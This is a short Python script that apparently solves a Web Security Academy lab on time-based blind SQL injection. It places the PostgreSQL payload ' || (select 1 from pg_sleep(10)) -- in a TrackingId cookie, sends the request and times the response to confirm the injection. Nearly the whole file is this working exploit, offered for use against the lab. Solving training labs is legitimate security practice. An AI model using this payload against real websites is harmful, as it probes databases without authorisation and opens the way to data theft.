from web_security_academy.core.utils import *
import time


def solve_lab(session):
    print_info(f'Causing a 10 second delay by visiting "/" with the following cookies:')
    print('{"TrackingId": "\' || (select 1 from pg_sleep(10)) --"}')

    cookies = {"TrackingId": "' || (select 1 from pg_sleep(10)) --"}
    start = time.perf_counter()
    session.get_path("/", cookies=cookies)
    end = time.perf_counter()

    response_time = end - start
    if response_time > 10:
        print_success(f"Response time: {response_time} seconds\n")
    else:
        print_fail(f"Response time: {response_time} seconds")
